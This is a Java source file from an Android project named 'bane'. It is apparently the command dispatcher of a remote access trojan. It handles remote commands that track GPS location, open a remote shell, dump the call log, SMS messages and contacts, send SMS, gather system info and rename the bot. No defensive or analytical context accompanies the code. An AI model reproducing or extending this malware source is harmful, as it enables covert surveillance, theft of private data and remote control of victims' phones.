package com.example.bane.dispatcher;

import android.content.Intent;

import com.bane.model.*;
import com.example.bane.bane.camera.CameraPhoto;
import com.example.bane.bane.dumper.CallsDumper;
import com.example.bane.bane.dumper.ContactsDumper;
import com.example.bane.bane.dumper.SMSDumper;
import com.example.bane.bane.gps.Tracker;
import com.example.bane.bane.sms.SMSSender;
import com.example.bane.bane.sysinfo.SysInfo;
import com.example.bane.connection.Connection;
import com.example.bane.BaneService;
import com.example.bane.bane.storage.Storage;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DefaultDispatcher extends Dispatcher {

    private Storage storage = Storage.Storage(BaneService.context);

    public DefaultDispatcher(Connection connection) {
        super(connection);
    }

    @Override
    public BaneObject dispatch(BaneObject request) {
        System.out.println(request);
        String command = ((String)request.values[0].value);
        if(command.contains("name")){
            String newName = ((String)request.values[0].value).replace("name ","");
            storage.set("name",newName);
            return new BaneObject(BaneCode.RESPONSE,"new name "+newName,null);
        } else if (command.equals("track")){
            ExecutorService e = Executors.newSingleThreadExecutor();
            try {
                return e.submit(new Tracker()).get();
            } catch (Exception ex) {
                return new BaneObject(BaneCode.ERROR, "Execution error while tracking", null);
            }
        } else if(command.contains("sopen")){
            // set the dispatcher to be the ShellDispatcher
            super.connection.setDispatcher(new ShellDispatcher(super.connection));
            return new BaneObject(BaneCode.RESPONSE,"Opened a Remote Shell",null);
        } else if(command.contains("dump")){
            switch(command.split(" ")[1]){
                case "calls":
                    return new CallsDumper().dump();
                case "sms":
                    return new SMSDumper().dump();
                case "contacts":
                    return new ContactsDumper().dump();
            }
            return new BaneObject(BaneCode.ERROR,"Dump param not recognized",null);
        } else if (command.contains("sendsms")){
            List<String> list = new ArrayList<String>();
            Matcher m = Pattern.compile("([^\"]\\S*|\".+?\")\\s*").matcher(command);
            while (m.find())
                list.add(m.group(1));
            return SMSSender.sendSMS(list.get(1),list.get(2).substring(1,list.get(2).length()-1));
        } else if(command.contains("sysinfo")){
            return SysInfo.sysinfo();
        }else {
            return new BaneObject(BaneCode.ERROR,"Command not recognized",null);
        }
    }
}
